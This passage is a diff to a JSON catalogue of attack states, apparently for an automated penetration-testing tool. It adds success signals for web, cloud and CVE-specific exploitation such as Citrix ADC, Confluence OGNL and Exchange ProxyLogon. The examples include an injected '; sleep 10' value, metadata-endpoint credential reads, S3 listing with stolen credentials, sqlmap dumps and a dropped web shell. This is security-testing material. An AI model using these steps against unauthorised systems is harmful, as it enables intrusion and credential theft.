@@ -9,7 +9,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "2fa_bypass"
+      "playbook_ref": "2fa_bypass",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "A specific response/parameter (e.g. mfa_verified=true) indicates second-factor completion"
+        }
+      ]
     },
     {
       "state_id": "2fa_bypass_after_step2",
@@ -19,7 +25,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "2fa_bypass"
+      "playbook_ref": "2fa_bypass",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Protected resource accessible without ever submitting a valid second factor"
+        }
+      ]
     },
     {
       "state_id": "2fa_bypass_after_step3",
@@ -29,7 +41,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "2fa_bypass"
+      "playbook_ref": "2fa_bypass",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Correct OTP found via exhaustive/high-volume guessing without being locked out"
+        }
+      ]
     },
     {
       "state_id": "2fa_bypass_confirmed",
@@ -39,7 +57,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "2fa_bypass"
+      "playbook_ref": "2fa_bypass",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Setting a client-side flag/parameter marks the session as MFA-verified without actual verification"
+        }
+      ]
     },
     {
       "state_id": "2fa_bypass_ruled_out",
@@ -49,7 +73,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "2fa_bypass"
+      "playbook_ref": "2fa_bypass",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "Expected result absent across the attempted variations of this technique."
+        }
+      ]
     },
     {
       "state_id": "account_takeover_after_step1",
@@ -59,7 +89,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "account_takeover"
+      "playbook_ref": "account_takeover",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Full list of flows that can change or grant access to account control"
+        }
+      ]
     },
     {
       "state_id": "account_takeover_after_step2",
@@ -69,7 +105,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "account_takeover"
+      "playbook_ref": "account_takeover",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Token space is small enough to brute-force, or not invalidated after use"
+        }
+      ]
     },
     {
       "state_id": "account_takeover_after_step3",
@@ -79,7 +121,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "account_takeover"
+      "playbook_ref": "account_takeover",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Reset link is generated using an attacker-supplied host"
+        }
+      ]
     },
     {
       "state_id": "account_takeover_confirmed",
@@ -89,7 +137,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "account_takeover"
+      "playbook_ref": "account_takeover",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "Account control is granted despite incomplete verification"
+        }
+      ]
     },
     {
       "state_id": "account_takeover_ruled_out",
@@ -99,7 +153,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "account_takeover"
+      "playbook_ref": "account_takeover",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "Expected result absent across the attempted variations of this technique."
+        }
+      ]
     },
     {
       "state_id": "api_target_identified",
@@ -109,7 +169,13 @@
       "target_types": [
         "api"
       ],
-      "playbook_ref": null
+      "playbook_ref": null,
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "Target is confirmed in-scope and reachable (rules of engagement / scope document)."
+        }
+      ]
     },
     {
       "state_id": "arbitrary_file_read_obtained",
@@ -120,7 +186,16 @@
         "web",
         "api"
       ],
-      "playbook_ref": null
+      "playbook_ref": null,
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "A known-content system file is returned verbatim in the response.",
+          "examples": [
+            "response body contains the exact contents of /etc/passwd or win.ini"
+          ]
+        }
+      ]
     },
     {
       "state_id": "auth_bypass_after_step1",
@@ -130,7 +205,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "auth_bypass"
+      "playbook_ref": "auth_bypass",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Multiple entry points to authenticated state identified"
+        }
+      ]
     },
     {
       "state_id": "auth_bypass_after_step2",
@@ -140,7 +221,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "auth_bypass"
+      "playbook_ref": "auth_bypass",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Protected resource accessible without authentication"
+        }
+      ]
     },
     {
       "state_id": "auth_bypass_after_step3",
@@ -150,7 +237,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "auth_bypass"
+      "playbook_ref": "auth_bypass",
+      "detection_signals": [
+        {
+          "signal_type": "tool_output",
+          "description": "Server trusts a client-supplied privilege claim"
+        }
+      ]
     },
     {
       "state_id": "auth_bypass_confirmed",
@@ -160,7 +253,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "auth_bypass"
+      "playbook_ref": "auth_bypass",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Later-stage endpoint succeeds without completing earlier required steps"
+        }
+      ]
     },
     {
       "state_id": "auth_bypass_ruled_out",
@@ -170,7 +269,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "auth_bypass"
+      "playbook_ref": "auth_bypass",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "Expected result absent across the attempted variations of this technique."
+        }
+      ]
     },
     {
       "state_id": "binary_target_identified",
@@ -180,7 +285,13 @@
       "target_types": [
         "binary"
       ],
-      "playbook_ref": null
+      "playbook_ref": null,
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "Target is confirmed in-scope and reachable (rules of engagement / scope document)."
+        }
+      ]
     },
     {
       "state_id": "broken_access_control_after_step1",
@@ -190,7 +301,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "broken_access_control"
+      "playbook_ref": "broken_access_control",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "List of admin/privileged-only endpoints"
+        }
+      ]
     },
     {
       "state_id": "broken_access_control_after_step2",
@@ -200,7 +317,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "broken_access_control"
+      "playbook_ref": "broken_access_control",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Privileged endpoint responds successfully despite low-privilege session"
+        }
+      ]
     },
     {
       "state_id": "broken_access_control_after_step3",
@@ -210,7 +333,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "broken_access_control"
+      "playbook_ref": "broken_access_control",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Cross-tenant data is returned"
+        }
+      ]
     },
     {
       "state_id": "broken_access_control_confirmed",
@@ -220,7 +349,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "broken_access_control"
+      "playbook_ref": "broken_access_control",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Server accepts and applies the unauthorized field, elevating privileges"
+        }
+      ]
     },
     {
       "state_id": "broken_access_control_ruled_out",
@@ -230,7 +365,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "broken_access_control"
+      "playbook_ref": "broken_access_control",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "Expected result absent across the attempted variations of this technique."
+        }
+      ]
     },
     {
       "state_id": "business_logic_flaw_after_step1",
@@ -240,7 +381,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "business_logic_flaw"
+      "playbook_ref": "business_logic_flaw",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "List of values the client sends that influence the final outcome (price, quantity, currency, state transitions)"
+        }
+      ]
     },
     {
       "state_id": "business_logic_flaw_after_step2",
@@ -250,7 +397,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "business_logic_flaw"
+      "playbook_ref": "business_logic_flaw",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Server accepts an inconsistent or attacker-favorable value"
+        }
+      ]
     },
     {
       "state_id": "business_logic_flaw_after_step3",
@@ -260,7 +413,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "business_logic_flaw"
+      "playbook_ref": "business_logic_flaw",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Later step succeeds without the required prior step (e.g. payment confirmed without payment)"
+        }
+      ]
     },
     {
       "state_id": "business_logic_flaw_confirmed",
@@ -270,7 +429,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "business_logic_flaw"
+      "playbook_ref": "business_logic_flaw",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Application processes an invalid business value as if valid"
+        }
+      ]
     },
     {
       "state_id": "business_logic_flaw_ruled_out",
@@ -280,7 +445,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "business_logic_flaw"
+      "playbook_ref": "business_logic_flaw",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "Expected result absent across the attempted variations of this technique."
+        }
+      ]
     },
     {
       "state_id": "cache_poisoning_after_step1",
@@ -290,7 +461,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "cache_poisoning"
+      "playbook_ref": "cache_poisoning",
+      "detection_signals": [
+        {
+          "signal_type": "timing",
+          "description": "Response is confirmed cacheable and shared across requests"
+        }
+      ]
     },
     {
       "state_id": "cache_poisoning_after_step2",
@@ -300,7 +477,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "cache_poisoning"
+      "playbook_ref": "cache_poisoning",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "A header (e.g. X-Forwarded-Host) changes the response content without changing the cache key"
+        }
+      ]
     },
     {
       "state_id": "cache_poisoning_after_step3",
@@ -310,7 +493,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "cache_poisoning"
+      "playbook_ref": "cache_poisoning",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Poisoned response is cached with attacker-controlled content"
+        }
+      ]
     },
     {
       "state_id": "cache_poisoning_confirmed",
@@ -320,7 +509,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "cache_poisoning"
+      "playbook_ref": "cache_poisoning",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Victim requests receive the attacker-controlled content directly from cache"
+        }
+      ]
     },
     {
       "state_id": "cache_poisoning_ruled_out",
@@ -330,7 +525,69 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "cache_poisoning"
+      "playbook_ref": "cache_poisoning",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "Expected result absent across the attempted variations of this technique."
+        }
+      ]
+    },
+    {
+      "state_id": "citrix_adc_identified",
+      "description": "Target is fingerprinted as a Citrix Application Delivery Controller (ADC) / Gateway appliance.",
+      "tier": "recon",
+      "value": "low",
+      "target_types": [
+        "network",
+        "web"
+      ],
+      "playbook_ref": null,
+      "technology": "Citrix ADC/Gateway",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Citrix-branded login portal at the default management path.",
+          "examples": [
+            "/vpn/index.html serves the Citrix Gateway login page"
+          ]
+        }
+      ]
+    },
+    {
+      "state_id": "citrix_adc_rce_confirmed",
+      "description": "Citrix ADC/Gateway directory traversal to RCE confirmed exploitable.",
+      "tier": "vulnerability_confirmed",
+      "value": "critical",
+      "target_types": [
+        "network",
+        "web"
+      ],
+      "playbook_ref": null,
+      "technology": "Citrix ADC/Gateway",
+      "cve_refs": [
+        "CVE-2019-19781"
+      ],
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "A crafted path-traversal request writes a malicious Perl/template file that is then triggered for execution.",
+          "examples": [
+            "a subsequently requested crafted path returns the output of an injected command"
+          ]
+        }
+      ]
+    },
+    {
+      "state_id": "citrix_adc_ruled_out",
+      "description": "The Citrix ADC directory traversal / RCE exploit was not successful against this target.",
+      "tier": "ruled_out",
+      "value": "none",
+      "target_types": [
+        "network",
+        "web"
+      ],
+      "playbook_ref": null
     },
     {
       "state_id": "clickjacking_after_step1",
@@ -340,7 +597,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "clickjacking"
+      "playbook_ref": "clickjacking",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "No framing-protection header present, or set to a permissive value"
+        }
+      ]
     },
     {
       "state_id": "clickjacking_after_step2",
@@ -350,7 +613,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "clickjacking"
+      "playbook_ref": "clickjacking",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "Target page renders inside the attacker's iframe"
+        }
+      ]
     },
     {
       "state_id": "clickjacking_after_step3",
@@ -360,7 +629,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "clickjacking"
+      "playbook_ref": "clickjacking",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "A click on the decoy actually triggers the sensitive action on the framed page"
+        }
+      ]
     },
     {
       "state_id": "clickjacking_confirmed",
@@ -370,7 +645,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "clickjacking"
+      "playbook_ref": "clickjacking",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Victim's click results in the unintended sensitive action being performed"
+        }
+      ]
     },
     {
       "state_id": "clickjacking_ruled_out",
@@ -380,7 +661,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "clickjacking"
+      "playbook_ref": "clickjacking",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "Expected result absent across the attempted variations of this technique."
+        }
+      ]
     },
     {
       "state_id": "cloud_credentials_obtained",
@@ -390,7 +677,17 @@
       "target_types": [
         "cloud"
       ],
-      "playbook_ref": null
+      "playbook_ref": null,
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "The metadata/credentials endpoint returns a JSON object with access key / secret key / session token fields.",
+          "examples": [
+            "response body contains \"AccessKeyId\", \"SecretAccessKey\", \"Token\" (AWS)",
+            "response body contains \"access_token\" and \"expires_in\" (GCP)"
+          ]
+        }
+      ]
     },
     {
       "state_id": "cloud_metadata_reachable",
@@ -402,7 +699,17 @@
         "api",
         "cloud"
       ],
-      "playbook_ref": null
+      "playbook_ref": null,
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "The SSRF-driven request to the metadata IP returns a metadata-service-shaped body rather than a connection error.",
+          "examples": [
+            "response body from 169.254.169.254 lists IAM role names (AWS)",
+            "response body from metadata.google.internal returns a service account list (GCP)"
+          ]
+        }
+      ]
     },
     {
       "state_id": "cloud_storage_read_access",
@@ -412,7 +719,16 @@
       "target_types": [
         "cloud"
       ],
-      "playbook_ref": null
+      "playbook_ref": null,
+      "detection_signals": [
+        {
+          "signal_type": "tool_output",
+          "description": "A storage list/get command succeeds and returns object listings or content using the obtained credentials.",
+          "examples": [
+            "`aws s3 ls s3://<bucket> --profile stolen` returns an object listing instead of AccessDenied"
+          ]
+        }
+      ]
     },
     {
       "state_id": "command_injection_after_step1",
@@ -422,7 +738,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "command_injection"
+      "playbook_ref": "command_injection",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "Candidate endpoints identified"
+        }
+      ]
     },
     {
       "state_id": "command_injection_after_step2",
@@ -432,7 +754,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "command_injection"
+      "playbook_ref": "command_injection",
+      "detection_signals": [
+        {
+          "signal_type": "timing",
+          "description": "Unexpected output, error, or delay suggesting command interpretation"
+        }
+      ]
     },
     {
       "state_id": "command_injection_after_step3",
@@ -442,7 +770,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "command_injection"
+      "playbook_ref": "command_injection",
+      "detection_signals": [
+        {
+          "signal_type": "timing",
+          "description": "Response time increases matching the injected delay"
+        }
+      ]
     },
     {
       "state_id": "command_injection_confirmed",
@@ -452,7 +786,16 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "command_injection"
+      "playbook_ref": "command_injection",
+      "detection_signals": [
+        {
+          "signal_type": "timing",
+          "description": "A time-based blind payload (sleep/ping -c) delays the response by the injected duration.",
+          "examples": [
+            "response time increases by ~10s when `; sleep 10` is injected, vs baseline"
+          ]
+        }
+      ]
     },
     {
       "state_id": "command_injection_ruled_out",
@@ -462,7 +805,67 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "command_injection"
+      "playbook_ref": "command_injection",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "Expected result absent across the attempted variations of this technique."
+        }
+      ]
+    },
+    {
+      "state_id": "confluence_identified",
+      "description": "Target is fingerprinted as Atlassian Confluence Server/Data Center.",
+      "tier": "recon",
+      "value": "low",
+      "target_types": [
+        "web"
+      ],
+      "playbook_ref": null,
+      "technology": "Atlassian Confluence",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Confluence-specific login page branding, /server-info.action, or X-Confluence-* headers.",
+          "examples": [
+            "response headers include \"X-Confluence-Request-Time\"",
+            "/server-info.action discloses the Confluence version"
+          ]
+        }
+      ]
+    },
+    {
+      "state_id": "confluence_ognl_confirmed",
+      "description": "Confluence OGNL injection RCE confirmed exploitable.",
+      "tier": "vulnerability_confirmed",
+      "value": "critical",
+      "target_types": [
+        "web"
+      ],
+      "playbook_ref": null,
+      "technology": "Atlassian Confluence",
+      "cve_refs": [
+        "CVE-2022-26134"
+      ],
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "An OGNL expression injected via a crafted URL path is evaluated server-side.",
+          "examples": [
+            "response reflects the evaluated result of an injected OGNL arithmetic expression, or an OOB callback fires"
+          ]
+        }
+      ]
+    },
+    {
+      "state_id": "confluence_ruled_out",
+      "description": "The Confluence OGNL injection exploit was not successful against this target.",
+      "tier": "ruled_out",
+      "value": "none",
+      "target_types": [
+        "web"
+      ],
+      "playbook_ref": null
     },
     {
       "state_id": "cors_misconfiguration_after_step1",
@@ -472,7 +875,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "cors_misconfiguration"
+      "playbook_ref": "cors_misconfiguration",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Response reflects the arbitrary Origin in Access-Control-Allow-Origin"
+        }
+      ]
     },
     {
       "state_id": "cors_misconfiguration_after_step2",
@@ -482,7 +891,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "cors_misconfiguration"
+      "playbook_ref": "cors_misconfiguration",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Both headers present together, enabling credentialed cross-origin reads"
+        }
+      ]
     },
     {
       "state_id": "cors_misconfiguration_after_step3",
@@ -492,7 +907,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "cors_misconfiguration"
+      "playbook_ref": "cors_misconfiguration",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Cross-origin JavaScript successfully reads the victim's authenticated response data"
+        }
+      ]
     },
     {
       "state_id": "cors_misconfiguration_confirmed",
@@ -502,7 +923,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "cors_misconfiguration"
+      "playbook_ref": "cors_misconfiguration",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "null origin or arbitrary subdomain also accepted"
+        }
+      ]
     },
     {
       "state_id": "cors_misconfiguration_ruled_out",
@@ -512,7 +939,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "cors_misconfiguration"
+      "playbook_ref": "cors_misconfiguration",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "Expected result absent across the attempted variations of this technique."
+        }
+      ]
     },
     {
       "state_id": "csrf_after_step1",
@@ -522,7 +955,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "csrf"
+      "playbook_ref": "csrf",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "List of sensitive POST/PUT/DELETE endpoints"
+        }
+      ]
     },
     {
       "state_id": "csrf_after_step2",
@@ -532,7 +971,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "csrf"
+      "playbook_ref": "csrf",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "No token required, or token not validated server-side; cookie is SameSite=None or unset"
+        }
+      ]
     },
     {
       "state_id": "csrf_after_step3",
@@ -542,7 +987,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "csrf"
+      "playbook_ref": "csrf",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "Request succeeds when submitted from a foreign origin while the victim's session cookie is attached"
+        }
+      ]
     },
     {
       "state_id": "csrf_confirmed",
@@ -552,7 +1003,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "csrf"
+      "playbook_ref": "csrf",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "State change occurs on the victim's account after visiting the malicious page"
+        }
+      ]
     },
     {
       "state_id": "csrf_ruled_out",
@@ -562,7 +1019,13 @@
       "target_types": [
         "web"
       ],
-      "playbook_ref": "csrf"
+      "playbook_ref": "csrf",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "Expected result absent across the attempted variations of this technique."
+        }
+      ]
     },
     {
       "state_id": "database_full_read_obtained",
@@ -573,7 +1036,16 @@
         "web",
         "api"
       ],
-      "playbook_ref": null
+      "playbook_ref": null,
+      "detection_signals": [
+        {
+          "signal_type": "tool_output",
+          "description": "A dump/extraction tool successfully enumerates table names and row contents beyond the originally targeted table.",
+          "examples": [
+            "sqlmap --dump lists multiple tables with row counts and sample data"
+          ]
+        }
+      ]
     },
     {
       "state_id": "dos_after_step1",
@@ -583,7 +1055,13 @@
       "target_types": [
         "other"
       ],
-      "playbook_ref": "dos"
+      "playbook_ref": "dos",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "Candidate endpoint with high server-side cost per low-cost client request"
+        }
+      ]
     },
     {
       "state_id": "dos_after_step2",
@@ -593,7 +1071,13 @@
       "target_types": [
         "other"
       ],
-      "playbook_ref": "dos"
+      "playbook_ref": "dos",
+      "detection_signals": [
+        {
+          "signal_type": "timing",
+          "description": "Processing time/memory grows non-linearly with crafted input size"
+        }
+      ]
     },
     {
       "state_id": "dos_after_step3",
@@ -603,7 +1087,13 @@
       "target_types": [
         "other"
       ],
-      "playbook_ref": "dos"
+      "playbook_ref": "dos",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Measurable latency/resource spike attributable to the crafted request"
+        }
+      ]
     },
     {
       "state_id": "dos_confirmed",
@@ -613,7 +1103,13 @@
       "target_types": [
         "other"
       ],
-      "playbook_ref": "dos"
+      "playbook_ref": "dos",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "No throttling observed after repeated expensive requests"
+        }
+      ]
     },
     {
       "state_id": "dos_ruled_out",
@@ -623,7 +1119,68 @@
       "target_types": [
         "other"
       ],
-      "playbook_ref": "dos"
+      "playbook_ref": "dos",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "Expected result absent across the attempted variations of this technique."
+        }
+      ]
+    },
+    {
+      "state_id": "exchange_identified",
+      "description": "Target is fingerprinted as a Microsoft Exchange Server (OWA/ECP reachable).",
+      "tier": "recon",
+      "value": "low",
+      "target_types": [
+        "web"
+      ],
+      "playbook_ref": null,
+      "technology": "Microsoft Exchange Server",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "OWA or ECP login portal reachable at the default paths.",
+          "examples": [
+            "/owa/ serves the Outlook Web App login page",
+            "/ecp/ serves the Exchange admin center login page"
+          ]
+        }
+      ]
+    },
+    {
+      "state_id": "exchange_rce_confirmed",
+      "description": "Microsoft Exchange Server RCE confirmed exploitable via the ProxyLogon/ProxyShell-family SSRF + authentication-bypass + arbitrary-file-write chain. Modeled here as a single consolidated exploit step; the real chain involves multiple intermediate CVEs (SSRF to bypass auth, then arbitrary file write to drop a web shell).",
+      "tier": "vulnerability_confirmed",
+      "value": "critical",
+      "target_types": [
+        "web"
+      ],
+      "playbook_ref": null,
+      "technology": "Microsoft Exchange Server",
+      "cve_refs": [
+        "CVE-2021-26855",
+        "CVE-2021-34473"
+      ],
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "A web shell dropped via the chain is reachable and executes commands.",
+          "examples": [
+            "a .aspx web shell at a predictable OWA-relative path returns command output"
+          ]
+        }
+      ]
+    },
+    {
+      "state_id": "exchange_ruled_out",
+      "description": "The Exchange ProxyLogon/ProxyShell exploit chain was not successful against this target.",
+      "tier": "ruled_out",
+      "value": "none",
+      "target_types": [
+        "web"
+      ],
+      "playbook_ref": null
     },
     {
       "state_id": "full_application_compromise",
@@ -634,7 +1191,16 @@
         "web",
         "api"
       ],
-      "playbook_ref": null
+      "playbook_ref": null,
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "All observed admin-only functionality (user management, data export, configuration) is reachable and functional.",
+          "examples": [
+            "admin dashboard fully loads and every linked admin action succeeds"
+          ]
+        }
+      ]
     },
     {
       "state_id": "full_cloud_account_compromise",
@@ -644,7 +1210,17 @@
       "target_types": [
         "cloud"
       ],
-      "playbook_ref": null
+      "playbook_ref": null,
+      "detection_signals": [
+        {
+          "signal_type": "tool_output",
+          "description": "IAM policy simulation/enumeration shows administrator-equivalent permissions for the obtained credentials.",
+          "examples": [
+            "`aws iam simulate-principal-policy` returns \"allowed\" for iam:*, ec2:*, etc.",
+            "pacu/ScoutSuite flags the credential set as admin-equivalent"
+          ]
+        }
+      ]
     },
     {
       "state_id": "full_host_compromise",
@@ -657,6 +1233,70 @@
         "network",
         "binary"
       ],
+      "playbook_ref": null,
+      "detection_signals": [
+        {
+          "signal_type": "tool_output",
+          "description": "A privilege-check command shows root/SYSTEM/Administrator rather than the original low-privilege identity.",
+          "examples": [
+            "`id` -> uid=0(root)",
+            "`whoami` -> nt authority\\system",
+            "`whoami /priv` shows SeDebugPrivilege/SeImpersonatePrivilege enabled and successfully used"
+          ]
+        }
+      ]
+    },
+    {
+      "state_id": "gitlab_exiftool_confirmed",
+      "description": "GitLab ExifTool RCE confirmed exploitable via crafted image upload.",
+      "tier": "vulnerability_confirmed",
+      "value": "critical",
+      "target_types": [
+        "web"
+      ],
+      "playbook_ref": null,
+      "technology": "GitLab",
+      "cve_refs": [
+        "CVE-2021-22205"
+      ],
+      "detection_signals": [
+        {
+          "signal_type": "tool_output",
+          "description": "An out-of-band callback fires when a crafted image file (malicious DjVu/exiftool metadata) is uploaded as an avatar/attachment.",
+          "examples": [
+            "interactsh logs a hit shortly after the crafted image is uploaded and processed"
+          ]
+        }
+      ]
+    },
+    {
+      "state_id": "gitlab_identified",
+      "description": "Target is fingerprinted as a self-hosted GitLab instance.",
+      "tier": "recon",
+      "value": "low",
+      "target_types": [
+        "web"
+      ],
+      "playbook_ref": null,
+      "technology": "GitLab",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "GitLab-specific sign-in page branding or /help page disclosing version.",
+          "examples": [
+            "/help page footer discloses the GitLab version string"
+          ]
+        }
+      ]
+    },
+    {
+      "state_id": "gitlab_ruled_out",
+      "description": "The GitLab ExifTool RCE exploit was not successful against this target.",
+      "tier": "ruled_out",
+      "value": "none",
+      "target_types": [
+        "web"
+      ],
       "playbook_ref": null
     },
     {
@@ -667,7 +1307,13 @@
       "target_types": [
         "api"
       ],
-      "playbook_ref": "graphql_abuse"
+      "playbook_ref": "graphql_abuse",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Full schema including types, fields, and mutations not exposed in the client app is returned"
+        }
+      ]
     },
     {
       "state_id": "graphql_abuse_after_step2",
@@ -677,7 +1323,13 @@
       "target_types": [
         "api"
       ],
-      "playbook_ref": "graphql_abuse"
+      "playbook_ref": "graphql_abuse",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "Hidden admin-only or debug fields/mutations discovered"
+        }
+      ]
     },
     {
       "state_id": "graphql_abuse_after_step3",
@@ -687,7 +1339,13 @@
       "target_types": [
         "api"
       ],
-      "playbook_ref": "graphql_abuse"
+      "playbook_ref": "graphql_abuse",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Sensitive field resolves data despite insufficient privileges"
+        }
+      ]
     },
     {
       "state_id": "graphql_abuse_confirmed",
@@ -697,7 +1355,13 @@
       "target_types": [
         "api"
       ],
-      "playbook_ref": "graphql_abuse"
+      "playbook_ref": "graphql_abuse",
+      "detection_signals": [
+        {
+          "signal_type": "http_response",
+          "description": "Server processes an excessively expensive query, causing high latency or resource exhaustion"
+        }
+      ]
     },
     {
       "state_id": "graphql_abuse_ruled_out",
@@ -707,7 +1371,13 @@
       "target_types": [
         "api"
       ],
-      "playbook_ref": "graphql_abuse"
+      "playbook_ref": "graphql_abuse",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
+          "description": "Expected result absent across the attempted variations of this technique."
+        }
+      ]
     },
     {
       "state_id": "hardcoded_secrets_after_step1",
@@ -717,7 +1387,13 @@
       "target_types": [
         "other"
       ],
-      "playbook_ref": "hardcoded_secrets"
+      "playbook_ref": "hardcoded_secrets",
+      "detection_signals": [
+        {
+          "signal_type": "tool_output",
+          "description": "Candidate strings matching API key/token/private-key formats found"
+        }
+      ]
     },
     {
       "state_id": "hardcoded_secrets_after_step2",
@@ -727,7 +1403,13 @@
       "target_types": [
         "other"
       ],
-      "playbook_ref": "hardcoded_secrets"
+      "playbook_ref": "hardcoded_secrets",
+      "detection_signals": [
+        {
+          "signal_type": "manual_judgment",
